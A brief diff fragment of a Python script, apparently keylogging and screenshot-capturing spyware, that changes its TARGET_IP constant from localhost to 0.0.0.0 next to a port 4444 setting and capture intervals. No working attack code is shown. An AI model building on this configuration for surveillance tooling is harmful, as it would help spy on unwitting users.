@@ -11,7 +11,7 @@ from scapy.all import sniff
 import threading
 import io
 
-TARGET_IP = "127.0.0.1"
+TARGET_IP = "0.0.0.0"
 TARGET_PORT = 4444
 KEYLOG_INTERVAL = 10
 SCREENSHOT_INTERVAL = 60
